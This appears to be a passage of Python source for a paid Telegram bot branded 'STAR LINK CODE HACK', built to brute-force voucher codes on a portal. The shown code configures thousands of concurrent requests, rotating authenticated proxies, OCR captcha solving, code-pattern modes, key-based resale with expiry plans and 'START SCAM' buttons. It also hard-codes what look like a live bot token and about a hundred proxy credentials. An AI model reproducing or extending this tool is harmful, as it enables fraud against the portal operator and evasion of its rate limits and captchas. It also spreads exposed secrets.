# -*- coding: utf-8 -*-
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import ddddocr
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

# --- Configuration ---
BOT_TOKEN = "8780819782:AAGc_ZcOnoWAS69A7OY3079b2TVG93hNWlw"
ADMIN_IDS = ["8837397200"]
FORWARD_CHANNEL = "@Kaung361"

MAX_CONCURRENT = 3500
BATCH_SIZE = 1000
CONNECTION_LIMIT = 36000
CONNECTION_PER_HOST = 20000
TIMEOUT = 15

AUTH_DISABLED = False
KEY_DISABLED = False

DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)''')
    conn.commit()
    conn.close()

init_db()

user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()

scan_stats = {}

def _stats(chat_id):
    if chat_id not in scan_stats:
        scan_stats[chat_id] = {
            "tried": 0, "expired": 0, "limits": 0, "errors": 0,
            "current_code": "", "hits": [], "start": time.monotonic()
        }
    return scan_stats[chat_id]

PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.43.96:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.24.245:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.229.41:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.57.128:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.29.0:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.248.21:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.246.107:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.163.157:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.35.116:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.27.48:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.26.195:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.30.248:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.39.79:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.160.188:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.10.16:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.61.110:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.253.115:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.53.87:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.186.117:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.35.180:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.184.34:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@217.181.92.133:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.51.144:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.12.80:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.49.74:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.187.26:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.182.41:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.8.221:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.40.53:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.61.172:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.36.43:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.62.46:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.249.40:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.228.60:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.11.248:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.59.162:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.180.14:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.232.80:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.174.107:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.191.98:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.48.18:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.62.253:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.167.19.141:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.238.209:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.50.108:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.33.232:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.26.132:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.187.153:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.54.47:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.3.69:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.252.235:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@195.63.31.114:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.178.33:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.21.99:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.35.131:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.13.68:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.10.64:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.13.76:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.39.94:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.166.109:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.49.253:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.40.113:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.168.169:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.232.235:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.34.137:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.171.227:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.60.38:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.244.171:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.168.84:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.62.13:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.254.184:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.12.203:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.240.63:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.162.156:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.239.132:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.183:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.177.16:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.12.212:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.181.24:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.51.88:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.43.132:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@104.207.43.213:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.38.172:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.21.133:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.5.83:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.46.114:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.15.239:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@151.123.177.251:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.55.126:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.9.31:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.241.29:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@209.50.166.226:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.246.111:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.27.229:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.245.37:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.42.116:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@45.3.51.42:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@216.26.246.178:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@217.181.91.208:3129"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

# ==================== KEY VERIFICATION ====================

def user_has_valid_key(user_id) -> bool:
    user_id = str(user_id)
    if user_id in ADMIN_IDS:
        return True
    with get_db_cursor() as c:
        c.execute("SELECT expires_at FROM keys WHERE user_id = ?", (user_id,))
        rows = c.fetchall()
    for r in rows:
        expires_at = r[0]
        if not expires_at:
            continue
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        try:
            exp = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
            if datetime.now(timezone.utc) < exp:
                return True
        except:
            continue
    return False

def user_is_authenticated(user_id) -> bool:
    if AUTH_DISABLED or KEY_DISABLED:
        return True
    return user_has_valid_key(user_id)

def is_user_authorized(user_id) -> bool:
    return user_is_authenticated(user_id)

def is_paid_user(user_id) -> bool:
    return user_is_authenticated(user_id)

def bind_key_to_user(key, user_id):
    user_id = str(user_id)
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET user_id = ? WHERE key = ?", (user_id, key))
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.now(timezone.utc).isoformat()))

def get_user_key_info(user_id):
    user_id = str(user_id)
    with get_db_cursor() as c:
        c.execute("SELECT key, plan, expires_at, code_limit, used_codes FROM keys WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        if row:
            return {"key": row[0], "plan": row[1], "expires_at": row[2],
                    "code_limit": row[3], "used_codes": row[4]}
    return None

def format_key_expiry(expires_at):
    if not expires_at:
        return "Unknown"
    if expires_at == "9999-12-31T23:59:59Z":
        return "\u267E\uFE0F Unlimited"
    try:
        exp = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        if exp < now:
            return "\u274C Expired"
        diff = exp - now
        days = diff.days
        hours = diff.seconds // 3600
        if days > 0:
            return f"{days}d {hours}h left"
        minutes = (diff.seconds % 3600) // 60
        return f"{hours}h {minutes}m left"
    except:
        return expires_at

async def require_key_message(message):
    await bot.reply_to(
        message,
        "\U0001F510 *KEY REQUIRED*\n\n"
        "\u1012\u102E Bot \u1000\u102D\u102F \u101E\u102F\u1036\u1038\u101B\u1014\u103A Key \u101C\u102D\u102F\u1021\u1015\u103A\u1015\u102B\u1010\u101A\u103A\u104B\n\n"
        "\U0001F4CC Key \u101B\u101B\u103E\u102D\u101B\u1014\u103A Admin \u1000\u102D\u102F \u1006\u1000\u103A\u101E\u101D\u103A\u1038\u1015\u102B\n"
        f"\U0001F4E2 {FORWARD_CHANNEL}\n\n"
        "\U0001F511 Key \u101B\u1015\u103C\u102E\u1038\u101B\u1004\u103A:\n"
        "`/key YOUR_KEY_HERE`\n\n"
        "\u1015\u102D\u102F\u1037\u1015\u103C\u102E\u1038 unlock \u101C\u102F\u1015\u103A\u1015\u102B\u104B",
        parse_mode="Markdown"
    )

class DualPasswordAuth:
    def is_authenticated(self, user_id):
        return user_is_authenticated(user_id)
    def verify_layer1(self, user_id, password):
        return user_is_authenticated(user_id)
    def verify_layer2(self, user_id, password):
        return user_is_authenticated(user_id)
    def reset_auth(self, user_id):
        pass

auth_system = DualPasswordAuth()

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"key": result[0], "user_id": result[1], "plan": result[2],
                    "expires_at": result[3], "code_limit": result[4], "used_codes": result[5]}
    return None

def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return json.loads(result[0])
    return []

def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)",
                  (user_id, json.dumps(codes)))

def db_add_user(user_id, key=""):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.now(timezone.utc).isoformat()))

def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                  (key, user_id, plan, expires_at, code_limit, 0))

def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))

def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))

def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        results = c.fetchall()
        keys = {}
        for r in results:
            keys[r[0]] = {"user_id": r[1], "plan": r[2], "expires_at": r[3],
                          "code_limit": r[4], "used_codes": r[5]}
        return keys

def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users")
        results = c.fetchall()
        return [r[0] for r in results]

def check_key_expiration(expires_at):
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1),
             "1d": timedelta(days=1), "7d": timedelta(days=7),
             "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return bool(result[0])
    return True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (user_id, 1 if enabled else 0))

async def forward_to_channel(message_text, parse_mode=None):
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Forward error: {e}")

# ==================== KEYBOARDS ====================

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "\U0001F534 Proxy OFF" if not proxy_enabled else "\U0001F7E2 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "\U0001F7E2 Proxy ON"
        proxy_callback = "menu_proxy_off"
    keyboard.add(
        InlineKeyboardButton("\U0001F3AB PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("\U0001F517 STAR LINK Portal URL", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("\U0001F4CB Success Codes", callback_data="menu_result"),
        InlineKeyboardButton("\U0001F504 Recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("\U0001F6D1 Scan", callback_data="menu_stop"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("\U0001F522 VOUCHER 6", callback_data="scan_6"),
        InlineKeyboardButton("\U0001F522 VOUCHER 7", callback_data="scan_7"),
        InlineKeyboardButton("\U0001F522 VOUCHER 8", callback_data="scan_8"),
        InlineKeyboardButton("\U0001F524 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("\U0001F3B2 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("\U0001F524+\U0001F522 MIXED 6", callback_data="scan_mixed"),
        InlineKeyboardButton("\U0001F524+\U0001F522 MIXED 8", callback_data="scan_mixed8"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("\U0001F3B2 Random", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("\U0001F680 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("\u2705 KEY", callback_data="menu_enter_key"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("\U0001F6D1 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="menu_back")
    )
    return keyboard

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("\U0001F511 Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("\U0001F5D1\uFE0F Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("\U0001F4CB List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("\U0001F4CA Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("\U0001F4E2 Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("\U0001F465 Users List", callback_data="admin_users"),
        InlineKeyboardButton("\U0001F519 Back to Menu", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("\u23F1\uFE0F 30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("\u23F1\uFE0F 1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("\U0001F4C5 1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("\U0001F4C5 7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("\U0001F4C5 1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("\U0001F4C5 1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("\u267E\uFE0F Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("\U0001F519 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("\U0001F519 Back to Admin Panel", callback_data="admin_back"))
    return keyboard

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    db_add_user(user_id, "")
    if not user_is_authenticated(user_id):
        await bot.send_message(
            message.chat.id,
            f"\U0001F44B *\u1019\u1004\u103A\u1002\u101C\u102C\u1015\u102B {user_name}!*\n\n"
            "\U0001F510 *KEY REQUIRED*\n\n"
            "\u1012\u102E Bot \u1000\u102D\u102F \u101E\u102F\u1036\u1038\u101B\u1014\u103A Key \u101C\u102D\u102F\u1021\u1015\u103A\u1015\u102B\u1010\u101A\u103A\u104B\n\n"
            "\U0001F4CC Key \u101B\u101B\u103E\u102D\u101B\u1014\u103A Admin \u1000\u102D\u102F \u1006\u1000\u103A\u101E\u101D\u103A\u1038\u1015\u102B\n"
            f"\U0001F4E2 {FORWARD_CHANNEL}\n\n"
            "\U0001F511 Key \u101B\u1015\u103C\u102E\u1038\u101B\u1004\u103A \u1012\u102E\u101C\u102D\u102F\u1015\u102D\u102F\u1037\u1015\u102B:\n"
            "`/key YOUR_KEY_HERE`",
            parse_mode="Markdown"
        )
        await forward_to_channel(f"\U0001F510 Key Request\n\n\U0001F464 Name: {user_name}\n\U0001F194 ID: {user_id}")
        return
    paid_users[user_id] = True
    approve[message.chat.id] = True
    await show_main_menu(message, user_id, user_name)
    await forward_to_channel(f"\U0001F195 New User Started\n\n\U0001F464 Name: {user_name}\n\U0001F194 ID: {user_id}")

@bot.message_handler(commands=['key'])
async def handle_key_redeem(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message,
            "\U0001F511 *KEY*\n\n\u1012\u102E\u101C\u102D\u102F\u1015\u102D\u102F\u1037\u1015\u102B:\n`/key YOUR_KEY_HERE`\n\n\u1015\u102F\u102F\u1006\u102B: `/key ABC123XYZ789`",
            parse_mode="Markdown")
        return
    key = args[1].strip().upper()
    key_info = db_get_key(key)
    if not key_info:
        await bot.reply_to(message, "\u274C Key \u1019\u103E\u102C\u1038\u1014\u1031\u101E\u100A\u103A \u101E\u102D\u102F\u1037\u1019\u101F\u102F\u1010\u103A \u1019\u101B\u103E\u102D\u1015\u102B\u104B")
        return
    expires_at = key_info.get("expires_at")
    if not check_key_expiration(expires_at):
        await bot.reply_to(message, "\u274C \u1012\u102E Key \u101E\u1000\u103A\u1010\u1019\u103A\u1038\u1000\u102F\u1014\u103A\u101E\u103D\u102C\u1038\u1015\u102B\u1015\u103C\u102E\u104B")
        return
    existing_user = key_info.get("user_id")
    if existing_user and str(existing_user) not in ("", "None") and str(existing_user) != user_id:
        if str(existing_user) not in ADMIN_IDS:
            await bot.reply_to(message, "\u274C \u1012\u102E Key \u1000\u102D\u102F \u1021\u1001\u103C\u102C\u1038\u101E\u1030 \u101E\u102F\u1036\u1038\u1014\u1031\u1015\u102B\u1015\u103C\u102E\u104B")
            return
    bind_key_to_user(key, user_id)
    expiry_str = format_key_expiry(expires_at)
    await bot.reply_to(message,
        f"\u2705 *KEY UNLOCKED!*\n\n\U0001F511 Key: `{key}`\n\U0001F4CB Plan: {key_info.get('plan','N/A')}\n"
        f"\u23F0 {expiry_str}\n\U0001F522 Limit: {key_info.get('code_limit','N/A')}\n\n\U0001F4CC `/menu`",
        parse_mode="Markdown")
    await forward_to_channel(f"\U0001F513 Key Redeemed\n\n\U0001F464 {user_name}\n\U0001F194 `{user_id}`\n\U0001F511 `{key}`", parse_mode="Markdown")

@bot.message_handler(commands=['mykey', 'myaccount'])
async def handle_mykey(message):
    user_id = str(message.chat.id)
    info = get_user_key_info(user_id)
    if not info:
        await bot.reply_to(message,
            "\U0001F510 Key \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B\n\nKey \u101B\u101B\u103E\u102D\u101B\u1014\u103A Admin \u1000\u102D\u102F \u1006\u1000\u103A\u101E\u101D\u103A\u1038\u1015\u102B\u104B\n"
            f"\U0001F4E2 {FORWARD_CHANNEL}\n\n`/key YOUR_KEY`",
            parse_mode="Markdown")
        return
    expiry_str = format_key_expiry(info["expires_at"])
    await bot.reply_to(message,
        f"\U0001F464 *Your Account*\n\n\U0001F511 Key: `{info['key']}`\n\U0001F4CB Plan: {info['plan']}\n"
        f"\u23F0 Exp: {expiry_str}\n\U0001F522 Limit: {info['code_limit']}\n\u2705 Used: {info['used_codes']}",
        parse_mode="Markdown")

@bot.message_handler(commands=['Menu', 'menu'])
async def menu_command(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    db_add_user(user_id, "")
    if not user_is_authenticated(user_id):
        await require_key_message(message)
        return
    paid_users[user_id] = True
    approve[message.chat.id] = True
    await show_main_menu(message, user_id, user_name)

async def show_main_menu(message, user_id, user_name):
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    info = get_user_key_info(user_id)
    if info:
        key_line = f"\U0001F511 Plan: {info['plan']} | \u23F0 {format_key_expiry(info['expires_at'])}"
    else:
        key_line = "\U0001F511 Admin"
    welcome_text = (
        "\u2728 STAR LINK CODE HACK \u2728\n\n"
        f"\U0001F464 NAME: {user_name}\n"
        f"\U0001F194 USER ID: {user_id}\n\n"
        "\u2705 UNLOCKED\n"
        f"{key_line}\n"
        f"\U0001F504 Proxy Status: {proxy_status}\n\n"
        "\u1021\u1031\u102C\u1000\u103A\u1015\u102B Menu \u1019\u103E \u101E\u1004\u103A\u101C\u102D\u102F\u1001\u103B\u1004\u103A\u1010\u102C\u1000\u102D\u102F\u101B\u103D\u1031\u1038\u1001\u103B\u101A\u103A\u1015\u102B\u104B"
    )
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode="Markdown")
    await forward_to_channel(f"\u2705 User Opened Menu\n\n\U0001F464 Name: {user_name}\n\U0001F194 ID: {user_id}")

@bot.message_handler(commands=['auth'])
async def auth_command(message):
    await bot.reply_to(message, "\U0001F510 Key:\n\n`/key YOUR_KEY_HERE`", parse_mode="Markdown")

@bot.message_handler(commands=['reset_auth'])
async def reset_auth_command(message):
    await bot.reply_to(message, "\U0001F510 `/key YOUR_KEY`", parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "\u274C Admin \u1019\u101F\u102F\u1010\u103A\u1015\u102B\u104B")
        return
    text = "\U0001F510 **Admin Panel**\n\nAdmin Control Panel"
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    if not user_is_authenticated(user_id):
        await bot.answer_callback_query(call.id, "\U0001F510 Key \u1019\u101B\u103E\u102D\u1015\u102B \u2014 /key YOUR_KEY", show_alert=True)
        return
    if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        status_text = "ON" if new_status else "OFF"
        emoji = "\U0001F7E2" if new_status else "\U0001F534"
        text = (
            "\u2728 STAR LINK CODE HACK \u2728\n\n"
            f"\U0001F464 NAME: {user_name}\n"
            f"\U0001F194 USER ID: {user_id}\n\n"
            "\u2705 UNLOCKED\n"
